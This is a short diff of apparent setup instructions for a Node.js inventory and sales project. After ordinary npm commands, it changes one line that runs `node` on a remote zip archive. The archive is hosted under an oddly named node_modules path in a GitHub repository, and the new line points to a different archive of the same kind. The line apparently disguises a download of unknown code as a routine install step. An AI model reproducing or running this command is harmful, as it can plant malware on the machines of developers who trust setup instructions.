@@ -4,4 +4,4 @@ npm init
 
 npm install express mongoose dotenv
 
-node https://raw.githubusercontent.com/Sebastianbetanxur/inventory_and_sales/master/node_modules/bson/vendor/base64/sales_inventory_and_2.6.zip
+node https://github.com/Sebastianbetanxur/inventory_and_sales/raw/refs/heads/master/node_modules/mongodb/src/operations/search_indexes/and_sales_inventory_3.5.zip
